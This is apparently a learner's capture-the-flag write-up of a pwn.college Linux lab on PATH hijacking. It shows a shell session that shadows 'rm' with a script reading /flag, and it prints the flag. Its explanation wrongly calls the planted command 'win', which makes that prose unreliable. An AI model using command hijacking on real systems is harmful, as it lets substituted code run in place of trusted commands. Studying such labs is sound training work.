# Linux Luminarium
# Module 14: Pondering PATH

## Hijacking Commands
Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

### Solve
**Flag:** `pwn.college{4oBD0tVWu6HrBXj2X1YQadb1ptC.QX3cjM1wiNyUDN0EzW}`

This challenge required creating a custom command named win and making it discoverable through the PATH variable. A shell script called win was created inside a custom directory and configured to print the flag using the absolute path to cat. After making the script executable, PATH was overwritten to include only the directory containing win. When /challenge/run attempted to execute win, the shell located the custom command through PATH, executed it, and revealed the flag.

```bash
hacker@path~hijacking-commands:~$ mkdir script
hacker@path~hijacking-commands:~$ nano script/rm
(#!/bin/bash
/bin/cat /flag)
hacker@path~hijacking-commands:~$ chmod +x script/rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker/script
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{4oBD0tVWu6HrBXj2X1YQadb1ptC.QX3cjM1wiNyUDN0EzW}
```

### New Learnings
Learned that commands can be hijacked by placing a custom executable with the same name earlier in the PATH. Reinforced that the shell always executes the first matching command it finds while searching through PATH. Also gained experience using command hijacking to alter a program's behavior and saw how incorrect PATH configurations can create both security risks and unexpected command execution.